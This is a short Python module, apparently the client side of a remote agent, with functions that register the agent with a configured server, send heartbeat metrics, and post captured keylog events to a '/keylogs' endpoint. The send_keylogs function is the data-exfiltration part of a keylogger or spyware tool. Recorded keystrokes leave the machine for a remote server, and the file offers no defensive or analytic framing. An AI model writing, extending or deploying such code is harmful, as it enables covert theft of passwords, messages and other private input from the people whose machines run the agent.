import requests
from config.settings import SERVER_URL

def register_agent(data):
    """
    Register a new agent with the server and return the assigned agent ID.
    """
    r = requests.post(f"{SERVER_URL}/agents/register", json=data)
    r.raise_for_status() 
    
    return r.json()["id"]

def send_metrics(agent_id, data):
    """
    Send heartbeat metrics to the server.
    """
    requests.post(f"{SERVER_URL}/metrics/{agent_id}", json=data)

def send_keylogs(agent_id, logs):
    """
    Send keylog events to the server.
    """
    r = requests.post(
        f"{SERVER_URL}/keylogs/{agent_id}",
        json={"events": logs},
        timeout=5
    )

    r.raise_for_status()